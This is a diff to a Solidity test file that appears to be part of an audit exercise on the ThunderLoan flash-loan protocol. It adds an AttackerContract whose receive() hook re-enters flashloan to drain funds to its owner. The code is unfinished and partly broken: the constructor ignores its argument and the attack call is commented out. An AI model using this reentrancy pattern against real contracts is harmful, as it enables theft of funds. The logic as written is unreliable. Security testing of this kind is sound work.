@@ -5,7 +5,7 @@ import { Test, console } from "forge-std/Test.sol";
 import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
 import { AssetToken } from "../../src/protocol/AssetToken.sol";
 import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
-
+import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 contract ThunderLoanTest is BaseTest {
     uint256 constant AMOUNT = 10e18;
     uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
@@ -95,6 +95,15 @@ contract ThunderLoanTest is BaseTest {
 
         console.log("Intial Attacker Balance : ", tokenA.balanceOf(address(attackerContract)));
         console.log("Intial ThunderLoan Balance : ", tokenA.balanceOf(address(thunderLoan)));
+
+        vm.startPrank(user);
+        tokenA.mint(address(attackerContract), AMOUNT); // Mint tokens to the attacker contract
+        // attackerContract.attacker(IERC20(address(tokenA)), amountBorrow); // Start the flashloan attack
+        vm.stopPrank();
+        console.log(address(attackerContract).balance);
+
+        // console.log("Final Attacker Balance : ", tokenA.balanceOf(address(attackerContract)));
+        // console.log("Final ThunderLoan Balance : ", tokenA.balanceOf(address(thunderLoan)));
     }
 }
 
@@ -102,18 +111,18 @@ contract AttackerContract {
     ThunderLoan public target;
     address public owner;
 
-    constructor(address _flashLoanAddress){
-        target=_flashLoanAddress;
+    constructor(address thunderLoan){
+        target=new ThunderLoan();
         owner=msg.sender;
     }
 
-    function attacker(ERC20Mock token , uint256 amount) public{
-        target.flashloan(address(this),ERC20Mock(token),amount,abi.encode(owner));
+    function attacker(IERC20 token , uint256 amount) public{
+        target.flashloan(address(this),IERC20(token),amount,abi.encode(owner));
     }
 
     receive() external payable{
         if(address(target).balance > 0){
-        target.flashloan(address(this),ERC20Mock(address(target)),address(target).balance,"");
+        target.flashloan(address(this),IERC20(address(target)),address(target).balance,"");
         }
 
         payable(owner).transfer(address(this).balance);
